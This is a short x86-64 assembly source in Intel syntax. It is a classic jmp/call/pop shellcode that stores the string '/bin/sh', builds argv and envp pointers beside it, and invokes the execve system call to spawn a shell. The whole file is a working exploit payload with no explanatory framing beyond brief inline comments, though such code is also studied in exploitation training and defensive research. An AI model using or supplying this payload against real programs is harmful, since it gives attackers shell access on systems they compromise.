.intel_syntax noprefix

.code64
jmp	l_data
l_code:
pop rdi                 # pointer to file name
mov [rdi + 8], rdi      # store pointer in dummy used as argv
lea rsi, [rdi + 8]      # pointer to argv
lea rdx, [rdi + 16]     # pointer to envp
mov rax, 59             # sys_execve
syscall

l_data:
call	l_code
fname:	.asciz "/bin/sh"
dummy:  .int 0xdeadbeef, 0xdeadbeef, 0x00000000, 0x00000000
